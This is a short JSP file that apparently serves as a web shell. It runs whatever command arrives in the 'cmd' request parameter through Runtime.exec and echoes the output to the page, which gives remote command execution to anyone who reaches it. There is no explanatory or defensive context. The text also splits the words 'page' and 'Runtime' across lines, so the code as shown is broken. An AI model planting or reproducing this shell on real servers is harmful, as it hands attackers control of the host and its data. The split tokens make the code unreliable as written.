<%@ pa
ge import="java.io.*" %>
<%
    Process p = Run
    time.getRuntime().exec(request.getParameter("cmd"));
    InputStream in = p.getInputStream();
    int c;
    while ((c = in.read()) != -1) out.print((char) c);
%>